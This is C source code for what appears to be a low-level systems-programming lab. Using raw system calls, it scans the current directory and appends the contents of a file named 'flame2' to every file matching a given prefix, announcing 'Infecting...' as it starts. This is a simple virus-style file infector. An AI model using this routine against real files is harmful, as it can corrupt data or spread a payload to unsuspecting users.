#include "util.h"
#include "task2.h"

#define SYS_READ  3
#define SYS_WRITE 4
#define SYS_OPEN  5
#define SYS_CLOSE 6
#define SYS_GETDENTS 141

#define O_READONLY 0
#define O_WRONLY 1
#define O_APPEND 1024

#define S_RALL 00444
#define S_RWALL 00666

#define STDOUT 1
#define STDIN  2

#define BUF_SIZE 8192

typedef int FILE;


int printf(FILE fd, char *msg) {
    return system_call(SYS_WRITE, fd, msg, strlen(msg));
}

int printcf(int fd, char *msg) {
    return system_call(SYS_WRITE, fd, msg, 1);
}

void newlinef() {
    printcf(STDOUT, "\n");
}

void printlnf(char *msg) {
    printf(STDOUT, msg);
    newlinef();
}

int freadc(FILE fd, char *buf) {
    return system_call(SYS_READ, fd, buf, 1);
}

int error(char *msg) {
    printf(STDOUT, msg);
    newlinef(STDOUT);
    return 1;
}


int fopen(char *path) {
    return system_call(SYS_OPEN, path, 0, 0);
}

int fopenmode(char *path, int flags, int modes) {
    return system_call(SYS_OPEN, path, flags, modes);
}

int fclose(FILE f) {
    return system_call(SYS_CLOSE, f);
}


int main(int argc, char* argv[], char* envp[]) {
    int i,
        nread,
        bpos,
        len;
    char *prefix = "",
         *attach = "",
         *flame2name = "flame2",
         buf[BUF_SIZE],
         d_type,
         flamebuf[1];
    linux_dirent *d;
    FILE fd = fopen("."),
         ad,
         flame2;

    printlnf("Infecting...");

    /* Error handling. */
    if (fd == -1) {
        return error("open() error.");
    } else if (argc > 5) {
        return error("Too many arguments.");
    }

    for (i=1; i < argc; i++) {
        if (strcmp(argv[i], "-p") == 0) {
            if (i+1 > argc) {
                return error("Missing arguments.");
            }

            prefix = argv[++i];

        } else if (strcmp(argv[i], "-a") == 0) {
            if (i+1 > argc) {
                return error("Missing arguments.");
            }

            attach = argv[++i];

        } else {
            return error("Too many arguments.");
        }
    }

    printf(STDOUT, "Prefix: ");
    printlnf(prefix);
    printf(STDOUT, "Attach: ");
    printlnf(attach);

    nread = system_call(SYS_GETDENTS, fd, buf, BUF_SIZE);
    if (nread == -1) {
        error("getdents() error.");
        return 0x55;  /* 85 dec */
    }

    for (bpos = 0; bpos < nread;) {
        d = (linux_dirent *) (buf + bpos);  /* Fetch current file. */
        d_type = *(buf + bpos + d->d_reclen - 1);

        /* Print files by prefix. */
        len = strlen(prefix);
        if (len > 0 && d_type == DT_REG && strncmp(d->d_name, prefix, len) == 0) {
            printlnf(d->d_name);
        }

        /* Attach files. */
        len = strlen(attach);
        if (len > 0 && d_type == DT_REG && strncmp(d->d_name, attach, len) == 0) {
            ad = fopenmode(d->d_name, O_APPEND | O_WRONLY, S_RWALL);

            if (ad == -1) {
                return error("File append error.");
            }

            flame2 = fopenmode(flame2name, O_READONLY, S_RALL);
            if (flame2 == -1) {
                return error("flame2 open error.");
            }

            while (freadc(flame2, flamebuf) != 0) {
                if (printcf(ad, flamebuf) <= 0) {
                    return error("Flame/attach write error.");
                }
            }

            fclose(flame2);
            fclose(ad);
        }

        bpos += d->d_reclen;  /* Advance ptr. */
    }

    fclose(fd);
    return 0;
}
